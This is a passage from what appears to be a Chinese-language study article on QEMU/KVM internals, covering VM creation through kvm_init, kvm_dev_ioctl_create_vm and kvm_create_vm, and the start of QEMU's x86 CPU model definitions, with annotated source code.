*ms)</span></span><br><span class="hljs-function"></span>&#123;<br>    MachineClass *mc = MACHINE_GET_CLASS(ms);<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> upgrade_note[] =<br>        <span class="hljs-string">&quot;Please upgrade to at least kernel 2.6.29 or recent kvm-kmod\n&quot;</span><br>        <span class="hljs-string">&quot;(see http://sourceforge.net/projects/kvm).\n&quot;</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>        <span class="hljs-keyword">int</span> num;<br>    &#125; num_cpus[] = &#123;<br>        &#123; <span class="hljs-string">&quot;SMP&quot;</span>,          smp_cpus &#125;,        <span class="hljs-comment">// 数量</span><br>        &#123; <span class="hljs-string">&quot;hotpluggable&quot;</span>, max_cpus &#125;,        <span class="hljs-comment">// 可热插拔</span><br>        &#123; <span class="hljs-literal">NULL</span>, &#125;<br>    &#125;, *nc = num_cpus;<br>    <span class="hljs-keyword">int</span> soft_vcpus_limit, hard_vcpus_limit;<br>    KVMState *s;<br>    <span class="hljs-keyword">const</span> KVMCapabilityInfo *missing_cap;<br>    <span class="hljs-keyword">int</span> ret;<br>    <span class="hljs-keyword">int</span> type = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *kvm_type;<br><br>    s = KVM_STATE(ms-&gt;accelerator);<br><br>    <span class="hljs-comment">// 确保目标页大小不大于主机页大小</span><br>    assert(TARGET_PAGE_SIZE &lt;= getpagesize());<br><br>    s-&gt;sigmask_len = <span class="hljs-number">8</span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> KVM_CAP_SET_GUEST_DEBUG</span><br>    QTAILQ_INIT(&amp;s-&gt;kvm_sw_breakpoints);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    QLIST_INIT(&amp;s-&gt;kvm_parked_vcpus);<br>    s-&gt;vmfd = <span class="hljs-number">-1</span>;<br>    s-&gt;fd = qemu_open(<span class="hljs-string">&quot;/dev/kvm&quot;</span>, O_RDWR);  <span class="hljs-comment">// 打开 KVM 设备文件</span><br>    <span class="hljs-keyword">if</span> (s-&gt;fd == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Could not access KVM kernel module: %m\n&quot;</span>);<br>        ret = -errno;<br>        <span class="hljs-keyword">goto</span> err;<br>    &#125;<br><br>    <span class="hljs-comment">// 获取 KVM API 版本并进行版本检查</span><br>    ret = kvm_ioctl(s, KVM_GET_API_VERSION, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (ret &lt; KVM_API_VERSION) &#123;<br>        <span class="hljs-keyword">if</span> (ret &gt;= <span class="hljs-number">0</span>) &#123;<br>            ret = -EINVAL;<br>        &#125;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;kvm version too old\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ret &gt; KVM_API_VERSION) &#123;<br>        ret = -EINVAL;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;kvm version not supported\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err;<br>    &#125;<br><br>    <span class="hljs-comment">// 检查支持的内存插槽数量</span><br>    s-&gt;nr_slots = kvm_check_extension(s, KVM_CAP_NR_MEMSLOTS);<br><br>    <span class="hljs-comment">// 如果未指定，则使用默认值</span><br>    <span class="hljs-keyword">if</span> (!s-&gt;nr_slots) &#123;<br>        s-&gt;nr_slots = <span class="hljs-number">32</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 检查虚拟 CPU 限制</span><br>    soft_vcpus_limit = kvm_recommended_vcpus(s);<br>    hard_vcpus_limit = kvm_max_vcpus(s);<br><br>    <span class="hljs-comment">// 检查每种类型 CPU 的数量限制</span><br>    <span class="hljs-keyword">while</span> (nc-&gt;name) &#123;<br>        <span class="hljs-keyword">if</span> (nc-&gt;num &gt; soft_vcpus_limit) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>                    <span class="hljs-string">&quot;Warning: Number of %s cpus requested (%d) exceeds &quot;</span><br>                    <span class="hljs-string">&quot;the recommended cpus supported by KVM (%d)\n&quot;</span>,<br>                    nc-&gt;name, nc-&gt;num, soft_vcpus_limit);<br><br>            <span class="hljs-keyword">if</span> (nc-&gt;num &gt; hard_vcpus_limit) &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Number of %s cpus requested (%d) exceeds &quot;</span><br>                        <span class="hljs-string">&quot;the maximum cpus supported by KVM (%d)\n&quot;</span>,<br>                        nc-&gt;name, nc-&gt;num, hard_vcpus_limit);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>        nc++;<br>    &#125;<br><br>    <span class="hljs-comment">// 获取 kvm-type 选项并根据机器类型确定 type 值</span><br>    kvm_type = qemu_opt_get(qemu_get_machine_opts(), <span class="hljs-string">&quot;kvm-type&quot;</span>);<br>    <span class="hljs-keyword">if</span> (mc-&gt;kvm_type) &#123;<br>        type = mc-&gt;kvm_type(kvm_type);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (kvm_type) &#123;<br>        ret = -EINVAL;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Invalid argument kvm-type=%s\n&quot;</span>, kvm_type);<br>        <span class="hljs-keyword">goto</span> err;<br>    &#125;<br><br>    <span class="hljs-comment">// 创建 KVM 虚拟机</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        ret = kvm_ioctl(s, KVM_CREATE_VM, type);<br>    &#125; <span class="hljs-keyword">while</span> (ret == -EINTR);<br><br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;ioctl(KVM_CREATE_VM) failed: %d %s\n&quot;</span>, -ret,<br>                strerror(-ret));<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> TARGET_S390X</span><br>        <span class="hljs-keyword">if</span> (ret == -EINVAL) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>                    <span class="hljs-string">&quot;Host kernel setup problem detected. Please verify:\n&quot;</span>);<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;- for kernels supporting the switch_amode or&quot;</span><br>                    <span class="hljs-string">&quot; user_mode parameters, whether\n&quot;</span>);<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>                    <span class="hljs-string">&quot;  user space is running in primary address space\n&quot;</span>);<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>                    <span class="hljs-string">&quot;- for kernels supporting the vm.allocate_pgste sysctl, &quot;</span><br>                    <span class="hljs-string">&quot;whether it is enabled\n&quot;</span>);<br>        &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>        <span class="hljs-keyword">goto</span> err;<br>    &#125;<br><br>    <span class="hljs-comment">// 设置 vmfd 并检查支持的扩展</span><br>    s-&gt;vmfd = ret;<br>    missing_cap = kvm_check_extension_list(s, kvm_required_capabilites);<br>    <span class="hljs-keyword">if</span> (!missing_cap) &#123;<br>        missing_cap =<br>            kvm_check_extension_list(s, kvm_arch_required_capabilities);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (missing_cap) &#123;<br>        ret = -EINVAL;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;kvm does not support %s\n%s&quot;</span>,<br>                missing_cap-&gt;name, upgrade_note);<br>        <span class="hljs-keyword">goto</span> err;<br>    &#125;<br><br>    <span class="hljs-comment">// 检查是否支持协同 MMIO</span><br>    s-&gt;coalesced_mmio = kvm_check_extension(s, KVM_CAP_COALESCED_MMIO);<br><br>    <span class="hljs-comment">// 检查是否支持合并内存区域</span><br>    s-&gt;broken_set_mem_region = <span class="hljs-number">1</span>;<br>    ret = kvm_check_extension(s, KVM_CAP_JOIN_MEMORY_REGIONS_WORKS);<br>    <span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>        s-&gt;broken_set_mem_region = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 检查是否支持虚拟 CPU 事件</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> KVM_CAP_VCPU_EVENTS</span><br>    s-&gt;vcpu_events = kvm_check_extension(s, KVM_CAP_VCPU_EVENTS);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-comment">// 检查是否支持 X86 ROBUST SINGLESTEP</span><br>    s-&gt;robust_singlestep =<br>        kvm_check_extension(s, KVM_CAP_X86_ROBUST_SINGLESTEP);<br><br>    <span class="hljs-comment">// 检查是否支持调试寄存器</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> KVM_CAP_DEBUGREGS</span><br>    s-&gt;debugregs = kvm_check_extension(s, KVM_CAP_DEBUGREGS);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-comment">// 检查是否支持 IRQ 路由</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> KVM_CAP_IRQ_ROUTING</span><br>    kvm_direct_msi_allowed = (kvm_check_extension(s, KVM_CAP_SIGNAL_MSI) &gt; <span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-comment">// 检查是否支持 PCI 2.3</span><br>    s-&gt;intx_set_mask = kvm_check_extension(s, KVM_CAP_PCI_2_3);<br><br>    <span class="hljs-comment">// 设置 IRQ 设置方式</span><br>    s-&gt;irq_set_ioctl = KVM_IRQ_LINE;<br>    <span class="hljs-keyword">if</span> (kvm_check_extension(s, KVM_CAP_IRQ_INJECT_STATUS)) &#123;<br>        s-&gt;irq_set_ioctl = KVM_IRQ_LINE_STATUS;<br>    &#125;<br><br>    <span class="hljs-comment">// 检查是否支持只读内存</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> KVM_CAP_READONLY_MEM</span><br>    kvm_readonly_mem_allowed =<br>        (kvm_check_extension(s, KVM_CAP_READONLY_MEM) &gt; <span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-comment">// 检查是否支持 IOEVENTFD</span><br>    kvm_eventfds_allowed =<br>        (kvm_check_extension(s, KVM_CAP_IOEVENTFD) &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 检查是否支持 IRQFD</span><br>    kvm_irqfds_allowed =<br>        (kvm_check_extension(s, KVM_CAP_IRQFD) &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 检查是否支持 IRQFD RESAMPLE</span><br>    kvm_resamplefds_allowed =<br>        (kvm_check_extension(s, KVM_CAP_IRQFD_RESAMPLE) &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 检查是否支持 VM 属性</span><br>    kvm_vm_attributes_allowed =<br>        (kvm_check_extension(s, KVM_CAP_VM_ATTRIBUTES) &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 检查是否支持任意长度的 IOEVENTFD</span><br>    kvm_ioeventfd_any_length_allowed =<br>        (kvm_check_extension(s, KVM_CAP_IOEVENTFD_ANY_LENGTH) &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 初始化架构相关内容</span><br>    ret = kvm_arch_init(ms, s);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> err;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果允许使用 IRQCHIP，则创建 IRQCHIP</span><br>    <span class="hljs-keyword">if</span> (machine_kernel_irqchip_allowed(ms)) &#123;<br>        kvm_irqchip_create(ms, s);<br>    &#125;<br><br>    <span class="hljs-comment">// 设置 KVM 状态</span><br>    kvm_state = s;<br><br>    <span class="hljs-comment">// 如果支持 EVENTFD，则设置 MEMORY 监听器的 eventfd 操作</span><br>    <span class="hljs-keyword">if</span> (kvm_eventfds_allowed) &#123;<br>        s-&gt;memory_listener.listener.eventfd_add = kvm_mem_ioeventfd_add;<br>        s-&gt;memory_listener.listener.eventfd_del = kvm_mem_ioeventfd_del;<br>    &#125;<br>    s-&gt;memory_listener.listener.coalesced_mmio_add = kvm_coalesce_mmio_region;<br>    s-&gt;memory_listener.listener.coalesced_mmio_del = kvm_uncoalesce_mmio_region;<br><br>    <span class="hljs-comment">// 注册 MEMORY 和 IO 监听器</span><br>    kvm_memory_listener_register(s, &amp;s-&gt;memory_listener,<br>                                 &amp;address_space_memory, <span class="hljs-number">0</span>);<br>    memory_listener_register(&amp;kvm_io_listener,<br>                             &amp;address_space_io);<br><br>    <span class="hljs-comment">// 检查是否支持多个 IOEVENTFD</span><br>    s-&gt;many_ioeventfds = kvm_check_many_ioeventfds();<br><br>    <span class="hljs-comment">// 设置 CPU 中断处理函数</span><br>    cpu_interrupt_handler = kvm_handle_interrupt;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err:<br>    assert(ret &lt; <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (s-&gt;vmfd &gt;= <span class="hljs-number">0</span>) &#123;<br>        close(s-&gt;vmfd);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (s-&gt;fd != <span class="hljs-number">-1</span>) &#123;<br>        close(s-&gt;fd);<br>    &#125;<br>    g_free(s-&gt;memory_listener.slots);<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="4-3-2-KVM侧虚拟机的创建"><a href="#4-3-2-KVM侧虚拟机的创建" class="headerlink" title="4.3.2 KVM侧虚拟机的创建"></a>4.3.2 KVM侧虚拟机的创建</h3><p>kvm_init最重要的作用是调用“/dev/kvm”设备的ioclt(KVM_CREATE_VM)接口在KVM模块中创建一台虚拟机。本质上一个QEMU进程就是一台虚拟机。KVM中用结构体kvm表示虚拟机</p><p>4.2节中提到，KVM在初始化的时候会注册“/dev/kvm”设备，该设备在内核对应的ioctl函数为kvm_dev_ioctl，该函数实现了所有KVM层面的ioctl，对于KVM_CREATE_VM，其处理函数是kvm_dev_ioctl_create_vm，代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">kvm_dev_ioctl_create_vm</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> type)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> r;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm</span> *<span class="hljs-title">kvm</span>;</span><br><br>    <span class="hljs-comment">// 调用 kvm_create_vm 函数创建一个虚拟机实例，并将其保存在 kvm 结构中</span><br>    kvm = kvm_create_vm(type);<br>    <span class="hljs-keyword">if</span> (IS_ERR(kvm))<br>        <span class="hljs-keyword">return</span> PTR_ERR(kvm);<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> KVM_COALESCED_MMIO_PAGE_OFFSET</span><br>    <span class="hljs-comment">// 如果支持合并 MMIO，调用 kvm_coalesced_mmio_init 进行初始化</span><br>    r = kvm_coalesced_mmio_init(kvm);<br>    <span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span>) &#123;<br>        kvm_put_kvm(kvm);<br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-comment">// 创建一个匿名的文件描述符（file descriptor），表示虚拟机实例</span><br>    <span class="hljs-comment">// 将 kvm_vm_fops 作为 file_operations，私有数据设置为刚刚创建的 kvm 结构</span><br>    r = anon_inode_getfd(<span class="hljs-string">&quot;kvm-vm&quot;</span>, &amp;kvm_vm_fops, kvm, O_RDWR | O_CLOEXEC);<br>    <span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span>)<br>        kvm_put_kvm(kvm);<br><br>    <span class="hljs-keyword">return</span> r;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>这段代码实现了在 KVM 模块中创建虚拟机的流程。它首先调用 <code>kvm_create_vm</code> 函数创建虚拟机实例，然后根据支持合并 MMIO 的情况进行初始化，最后通过 <code>anon_inode_getfd</code> 创建一个匿名文件描述符，将虚拟机实例与文件描述符关联，以便后续通过该文件描述符进行虚拟机操作</p><p>kvm_create_vm是创建虚拟机的核心函数，代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> struct kvm *<span class="hljs-title">kvm_create_vm</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> type)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> r, i;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm</span> *<span class="hljs-title">kvm</span> =</span> kvm_arch_alloc_vm();<br><br>    <span class="hljs-keyword">if</span> (!kvm)<br>        <span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);<br><br>    <span class="hljs-comment">// 初始化虚拟机的锁、计数等成员</span><br>    spin_lock_init(&amp;kvm-&gt;mmu_lock);<br>    atomic_inc(&amp;current-&gt;mm-&gt;mm_count);<br>    kvm-&gt;mm = current-&gt;mm;<br>    kvm_eventfd_init(kvm);<br>    mutex_init(&amp;kvm-&gt;lock);<br>    mutex_init(&amp;kvm-&gt;irq_lock);<br>    mutex_init(&amp;kvm-&gt;slots_lock);<br>    atomic_set(&amp;kvm-&gt;users_count, <span class="hljs-number">1</span>);<br>    INIT_LIST_HEAD(&amp;kvm-&gt;devices);<br><br>    <span class="hljs-comment">// 调用架构相关的初始化函数</span><br>    r = kvm_arch_init_vm(kvm, type);<br>    <span class="hljs-keyword">if</span> (r)<br>        <span class="hljs-keyword">goto</span> out_err_no_disable;<br><br>    <span class="hljs-comment">// 开启硬件虚拟化</span><br>    r = hardware_enable_all();<br>    <span class="hljs-keyword">if</span> (r)<br>        <span class="hljs-keyword">goto</span> out_err_no_disable;<br><br>    <span class="hljs-comment">// 初始化其他数据结构和成员</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_HAVE_KVM_IRQFD</span><br>    INIT_HLIST_HEAD(&amp;kvm-&gt;irq_ack_notifier_list);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-comment">// 分配内存槽等数据结构</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; KVM_ADDRESS_SPACE_NUM; i++) &#123;<br>        kvm-&gt;memslots[i] = kvm_alloc_memslots();<br>        <span class="hljs-keyword">if</span> (!kvm-&gt;memslots[i])<br>            <span class="hljs-keyword">goto</span> out_err_no_srcu;<br>    &#125;<br><br>    <span class="hljs-comment">// 初始化 srcu 结构</span><br>    <span class="hljs-keyword">if</span> (init_srcu_struct(&amp;kvm-&gt;srcu))<br>        <span class="hljs-keyword">goto</span> out_err_no_srcu;<br>    <span class="hljs-keyword">if</span> (init_srcu_struct(&amp;kvm-&gt;irq_srcu))<br>        <span class="hljs-keyword">goto</span> out_err_no_irq_srcu;<br><br>    <span class="hljs-comment">// 分配总线数据结构</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; KVM_NR_BUSES; i++) &#123;<br>        kvm-&gt;buses[i] = kzalloc(<span class="hljs-keyword">sizeof</span>(struct kvm_io_bus),<br>                                GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!kvm-&gt;buses[i])<br>            <span class="hljs-keyword">goto</span> out_err;<br>    &#125;<br><br>    <span class="hljs-comment">// 初始化 MMU 通知机制</span><br>    r = kvm_init_mmu_notifier(kvm);<br>    <span class="hljs-keyword">if</span> (r)<br>        <span class="hljs-keyword">goto</span> out_err;<br><br>    <span class="hljs-comment">// 将虚拟机加入全局虚拟机链表</span><br>    spin_lock(&amp;kvm_lock);<br>    list_add(&amp;kvm-&gt;vm_list, &amp;vm_list);<br>    spin_unlock(&amp;kvm_lock);<br><br>    preempt_notifier_inc();<br><br>    <span class="hljs-keyword">return</span> kvm;<br><br><span class="hljs-comment">// 出错处理</span><br>out_err:<br>    cleanup_srcu_struct(&amp;kvm-&gt;irq_srcu);<br>out_err_no_irq_srcu:<br>    cleanup_srcu_struct(&amp;kvm-&gt;srcu);<br>out_err_no_srcu:<br>    hardware_disable_all();<br>out_err_no_disable:<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; KVM_NR_BUSES; i++)<br>        kfree(kvm-&gt;buses[i]);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; KVM_ADDRESS_SPACE_NUM; i++)<br>        kvm_free_memslots(kvm, kvm-&gt;memslots[i]);<br>    kvm_arch_free_vm(kvm);<br>    mmdrop(current-&gt;mm);<br>    <span class="hljs-keyword">return</span> ERR_PTR(r);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这段代码主要完成了以下操作：</p><ol><li>分配并初始化 <code>kvm</code> 结构体，表示一个虚拟机。</li><li>初始化虚拟机的各种锁、计数等成员。</li><li>调用架构相关的初始化函数，如 <code>kvm_arch_init_vm</code>。</li><li>开启硬件虚拟化功能。</li><li>初始化内存槽等数据结构。</li><li>初始化 MMU 通知机制。</li><li>将虚拟机添加到全局虚拟机链表中。</li><li>返回创建的虚拟机实例。</li></ol><p>尤其需要注意的是：</p><ul><li>kvm_create_vm接着会初始化KVM的相关成员，如这里的mmu_lock成员表示操作虚拟机MMU数据的锁，由于虚拟机的内存其实也就是QEMU进程的虚拟内存，所以这里需要引用到当前QEMU进程的mm_struct。对应代码<code>atomic_inc(&amp;current-&gt;mm-&gt;mm_count);</code></li><li>KVM有个类型为kvm_arch的arch成员，用于存放与架构相关的数据，kvm_arch_init_vm用来初始化这些数据。对应<code>r = kvm_arch_init_vm(kvm, type);//初始化类型为kvm_arch的arch成员</code></li><li>接下来kvm_create_vm调用hardware_enable_all来最终开启VMX模式，hardware_enable_all会<strong>在创建第一个虚拟机的时候</strong>对每个CPU调用hardware_enable_nolock，后者会调用kvm_arch_hardware_enable函数。<ul><li>r = hardware_enable_all();</li><li>on_each_cpu(hardware_enable_nolock, NULL, 1);</li><li>hardware_enable_nolock调用kvm_arch_hardware_enable函数</li><li>kvm_arch_hardware_enable主要<strong>调用Intel VMX实现的hardware_enable回调函数</strong>，该函数的主要作用就是<strong>设置CR4的VMXE位并且调用VMXON指令开启VMX</strong></li></ul></li></ul><h2 id="4-4-QEMU-CPU的创建"><a href="#4-4-QEMU-CPU的创建" class="headerlink" title="4.4 QEMU CPU的创建"></a>4.4 QEMU CPU的创建</h2><h3 id="4-4-1-CPU模型定义"><a href="#4-4-1-CPU模型定义" class="headerlink" title="4.4.1 CPU模型定义"></a>4.4.1 CPU模型定义</h3><p>QEMU（Quick Emulator）的CPU模型继承结构</p><ul><li>QEMU是一个能够模拟多种硬件架构的工具，它可以在宿主机上模拟运行不同架构的CPU</li><li>为了支持不同的CPU模型和架构，需要建立一种继承结构来表示这些CPU对象</li><li>TYPE_X86_CPU，它表示x86架构下的通用CPU功能。在这个类型的基础上，根据具体的物理CPU或虚拟CPU模型，创建了不同的CPU类型，例如”pentium”、”Haswell”等。这些具体的CPU类型会在基本的TYPE_X86_CPU类型的基础上添加特定的功能和属性，以模拟各种不同的CPU行为</li><li>存在一个名为”qemu-x86_64-cpu”的虚拟CPU模型，它是默认情况下在x86_64架构下使用的CPU模型</li></ul><p>QEMU支持的x86 CPU都定义在一个builtin_x86_defs数组中，该数组的类型为X86CPUDefinition，定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">X86CPUDefinition</span> &#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>    <span class="hljs-keyword">uint32_t</span> level;<br>    <span class="hljs-keyword">uint32_t</span> xlevel;<br>    <span class="hljs-comment">/* vendor is zero-terminated, 12 character ASCII string */</span><br>    <span class="hljs-keyword">char</span> vendor[CPUID_VENDOR_SZ + <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">int</span> family;<br>    <span class="hljs-keyword">int</span> model;<br>    <span class="hljs-keyword">int</span> stepping;<br>    FeatureWordArray features;<br>    <span class="hljs-keyword">char</span> model_id[<span class="hljs-number">48</span>];<br>&#125;;<br><br></code></pre></td></tr></table></figure><ol><li><code>const char *name;</code>：这是一个指向表示CPU名称的字符串的指针。它用于标识特定的CPU模型，例如 “pentium”、”Haswell” 等。</li><li><code>uint32_t level;</code>：这个字段表示CPUID指令支持的最大功能号。CPUID是一个指令，用于查询处理器的特性和功能。</li><li><code>uint32_t xlevel;</code>：这个字段表示CPUID扩展功能支持的最大功能号。xlevel对应于CPUID中的扩展功能。</li><li><code>char vendor[CPUID_VENDOR_SZ + 1];</code>：这是一个包含CPU制造商信息的字符数组。它是一个12字节的ASCII字符串，以NULL结尾，用于标识CPU的制造商。</li><li><code>int family;</code>：这个字段表示CPU家族（family）的标识。家族在x86体系结构中是一个较大的分类，用于标识CPU在某个系列中的归属。</li><li><code>int model;</code>：这个字段表示CPU型号（model）。型号用于更细致地标识CPU在特定家族中的具体型号。</li><li><code>int stepping;</code>：这个字段表示CPU的步进信息，用于进一步区分同一型号中的不同版本。</li><li><code>FeatureWordArray features;</code>：这是一个记录CPU特性的数组。它可能是一个位数组，每个位对应一个特定的CPU特性，用于描述CPU的功能和支持的扩展。</li><li><code>char 